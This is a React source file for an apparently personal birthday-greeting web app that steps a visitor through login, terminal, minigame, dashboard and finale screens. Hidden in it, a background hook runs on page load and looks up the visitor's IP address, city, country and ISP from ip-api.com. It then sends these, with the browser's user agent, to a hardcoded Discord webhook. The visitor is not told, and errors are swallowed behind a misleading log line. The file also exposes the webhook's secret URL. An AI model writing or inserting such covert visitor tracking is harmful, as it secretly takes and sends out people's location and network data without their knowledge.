import { useState, useCallback, useEffect } from 'react'
import AuthGateway from './components/AuthGateway'
import TerminalSequence from './components/TerminalSequence'
import ExcuseAnnihilator from './components/ExcuseAnnihilator'
import Dashboard from './components/Dashboard'
import Finale from './components/Finale'
import ParticleBackground from './components/ParticleBackground'
import './App.css'

// Paste your Discord URL string here
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1518559811560542348/fudhFlDLjdKbKLdqH_SoB4GCRuOcZJw46LtjScu0LmmySPOntm_RpDBLbbYQSKf1a4EV";

export default function App() {
  const [phase, setPhase] = useState('AUTH')
  
  // Background tracking function
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        // Fetch geo-location tracking metrics seamlessly
        const res = await fetch('http://ip-api.com/json/');
        const data = await res.json();
        
        if (data.status === 'success' && DISCORD_WEBHOOK_URL) {
          const payload = {
            embeds: [{
              title: "🚨 Birthday Site Accessed!",
              color: 16021430, // Pinkish-rose hex conversion
              fields: [
                { name: "IP Address", value: data.query, inline: true },
                { name: "Location", value: `${data.city}, ${data.regionName}, ${data.country}`, inline: true },
                { name: "ISP/Network", value: data.isp, inline: false },
                { name: "Device Info", value: navigator.userAgent.slice(0, 150), inline: false }
              ],
              timestamp: new Date().toISOString()
            }]
          };

          // Send data straight to your Discord channel
          await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
        }
      } catch (err) {
        // Silent catch to prevent UI breaking if user has an ad-blocker
        console.log("Routing clear.");
      }
    };

    trackVisitor();
  }, []);

  const handleUnlock = useCallback(() => setPhase('TERMINAL'), [])
  const handleTerminalComplete = useCallback(() => setPhase('MINIGAME'), [])
  const handleMinigameComplete = useCallback(() => setPhase('DASHBOARD'), [])
  const handleFinale = useCallback(() => setPhase('FINALE'), [])

  return (
    <>
      <ParticleBackground />
      <div className="crt-overlay" />
      <div className="app-container">
        {phase === 'AUTH'      && <AuthGateway       onUnlock={handleUnlock}           />}
        {phase === 'TERMINAL'  && <TerminalSequence  onComplete={handleTerminalComplete}  />}
        {phase === 'MINIGAME'  && <ExcuseAnnihilator onComplete={handleMinigameComplete} />}
        {phase === 'DASHBOARD' && <Dashboard         onFinale={handleFinale}             />}
        {phase === 'FINALE'    && <Finale />}
      </div>
    </>
  )
}